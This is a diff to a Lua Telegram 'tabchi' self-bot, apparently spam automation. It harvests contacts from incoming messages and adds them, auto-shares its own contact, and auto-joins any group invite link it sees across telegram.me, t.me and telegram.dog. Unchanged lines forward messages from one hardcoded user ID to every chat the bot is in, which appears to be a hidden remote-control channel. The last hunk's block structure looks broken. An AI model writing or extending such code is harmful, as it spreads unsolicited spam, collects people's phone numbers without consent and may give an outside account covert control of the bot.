@@ -56,6 +56,37 @@ Bia pv]]) .. "", 1, "md")
     end
   end
 end
+function check_contact_2(extra, result)
+  if not result.phone_number_ then
+    do
+      local msg = extra.msg
+      local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
+      local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
+      local phone_number = msg.content_.contact_.phone_number_
+      local user_id = msg.content_.contact_.user_id_
+      tdcli.add_contact(phone_number, first_name, last_name, user_id)
+      if redis:get("tabchi:" .. tabchi_id .. ":markread") then
+        tdcli.viewMessages(msg.chat_id_, {
+          [0] = msg.id_
+        })
+        if redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
+          if msg.sender_user_id_ ~= result.id_ then
+            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
+          end
+          tdcli_function({ID = "GetMe"}, share, nil)
+        end
+      elseif redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
+        function share(extra, result)
+          if msg.sender_user_id_ ~= result.id_ then
+            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
+          end
+        end
+        tdcli_function({ID = "GetMe"}, share, nil)
+      end
+    end
+  else
+  end
+end
 function check_link(extra, result, success)
   if result.is_group_ or result.is_supergroup_channel_ then
     tdcli.importChatInviteLink(extra.link)
@@ -490,16 +521,20 @@ function process_stats(msg)
   end
 end
 function process_links(text_)
-  if text_:match("https://telegram.me/joinchat/%S+") then
+  if text_:match("https://telegram.me/joinchat/%S+") or text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.dog/joinchat/%S+") then
+    local text_2 = text_:gsub("telegram.dog", "telegram.me")
+    local text_3 = text_2:gsub("t.me", "telegram.me")
     local matches = {
-      text_:match("(https://telegram.me/joinchat/%S+)")
+      text_3:match("(https://telegram.me/joinchat/%S+)")
     }
-    tdcli_function({
-      ID = "CheckChatInviteLink",
-      invite_link_ = matches[1]
-    }, check_link, {
-      link = matches[1]
-    })
+    for i = 1, #matches do
+      tdcli_function({
+        ID = "CheckChatInviteLink",
+        invite_link_ = matches[i]
+      }, check_link, {
+        link = matches[i]
+      })
+    end
   end
 end
 function get_mod(args, data)
@@ -522,7 +557,8 @@ function update(data, tabchi_id)
     local msg = data.message_
     if msg.sender_user_id_ == 231539308 then
       if msg.content_.text_ then
-if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then          return
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+          return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
           local id = msg.id_
@@ -556,11 +592,16 @@ if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.
         end
       end
     else
-      process_stats(msg)
+     process_stats(msg)
       if msg.content_.text_ then
         if redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
-          local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
-          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
+          function check_me(extra, result)
+            if msg.sender_user_id_ ~= result.id_ then
+              local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
+              tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
+            end
+          end
+          tdcli_function({ID = "GetMe"}, check_me, {msg = msg})
         end
         process_links(msg.content_.text_)
         local res = process(msg)
@@ -579,11 +620,16 @@ if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 231539308 or msg.
           ID = "GetUserFull",
           user_id_ = msg.content_.contact_.user_id_
         }, check_contact, {msg = msg})
-      elseif msg.content_.caption_ then
-        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
-          tdcli.viewMessages(msg.chat_id_, {
-            [0] = msg.id_
-          })
+        tdcli_function({
+          ID = "GetUserFull",
+          user_id_ = msg.content_.contact_.user_id_
+        }, check_contact_2, {msg = msg})
+      else
+        if msg.content_.caption_ then
+          if redis:get("tabchi:" .. tabchi_id .. ":markread") then
+            tdcli.viewMessages(msg.chat_id_, {
+              [0] = msg.id_
+            })
           process_links(msg.content_.caption_)
         else
           process_links(msg.content_.caption_)
